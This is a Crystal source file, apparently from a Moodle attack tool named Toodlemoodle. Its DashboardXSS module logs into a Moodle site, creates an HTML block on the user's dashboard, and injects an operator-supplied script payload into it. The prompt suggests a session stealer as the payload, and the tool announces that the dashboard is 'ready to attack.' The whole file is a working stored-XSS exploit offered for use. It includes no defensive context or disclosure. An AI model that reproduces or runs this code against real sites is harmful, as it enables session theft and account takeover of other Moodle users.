# TODO: Write documentation for `Toodlemoodle`
require "http/client"
require "option_parser"
require "json"
require "base64"

module TMoodleActions
  class DashboardXSS
    def perform(target)
      puts "[?] Enter your Moodle username"
      username = gets().not_nil!
      puts "[?] Enter your Moodle password"
      psw = gets().not_nil!
      sess_info = SessionInfo.new
      session = sess_info.get_session(target, username, psw)
      sess_key = session["session_key"]
      headers = HTTP::Headers.new
      headers.add("Cookie", "MoodleSession=" + session["moodle_session"])
      headers.add("Content-Type", "application/x-www-form-urlencoded")
      params = HTTP::Params.build do |form|
        form.add "edit", "1"
        form.add "sesskey", sess_key
      end
      post = HTTP::Client.post(target + "/my/index.php", headers: headers, body: params)

      add_block = http_get("#{target}/my/index.php?bui_addblock&sesskey=#{sess_key}&bui_addblock=html", session["moodle_session"])

      dashboard_with_block = http_get("#{target}/my/index.php", session["moodle_session"]).body
      block_id = dashboard_with_block.match(/\(new HTML block\)<\/a>(?:\s)*<aside id="inst(?<block_id>([0-9])+)"/).not_nil!.named_captures["block_id"]
      puts "[*] Block id: #{block_id}"
      puts "[?] Enter an XSS payload (e.g. session stealer) to send including <script> tags:"
      payload = gets().not_nil!
      puts "[>] Sending payload to target..."
      headers = HTTP::Headers.new
      headers.add("Cookie", "MoodleSession=" + session["moodle_session"])
      headers.add("Content-Type", "application/x-www-form-urlencoded")
      # data = HTTP::Params.encode(data)
      params = HTTP::Params.build do |form|
        form.add "bui_editid", block_id
        form.add "sesskey", sess_key
        form.add "_qf__block_html_edit_form", "1"
        form.add "config_text[text]", payload
        form.add "config_title", ""
      end
      post = HTTP::Client.post(target + "/my/index.php", headers: headers, body: params)

      headers = HTTP::Headers.new
      headers.add("Cookie", "MoodleSession=" + session["moodle_session"])
      headers.add("Content-Type", "application/x-www-form-urlencoded")
      params = HTTP::Params.build do |form|
        form.add "edit", ""
        form.add "sesskey", sess_key
      end
      post = HTTP::Client.post(target + "/my/index.php", headers: headers, body: params)

      if post.status_code == 200
        puts "[***] Payload delivered. Your dashboard is now ready to attack."
      else
        puts "[!] Error!"
      end
    end

    private def http_get(url, moodle_session)
      headers = HTTP::Headers.new
      headers.add("Cookie", "MoodleSession=" + moodle_session.to_s)
      return HTTP::Client.get(url, headers: headers)
    end
  end
end
